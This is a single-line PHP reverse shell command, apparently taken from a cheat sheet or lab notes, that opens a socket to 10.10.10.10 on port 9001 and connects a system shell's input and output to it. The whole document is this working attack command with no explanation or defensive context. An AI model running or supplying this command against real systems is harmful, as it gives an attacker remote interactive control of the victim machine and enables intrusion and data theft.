php -r '$sock=fsockopen("10.10.10.10",9001);popen("sh <&3 >&3 2>&3", "r");'
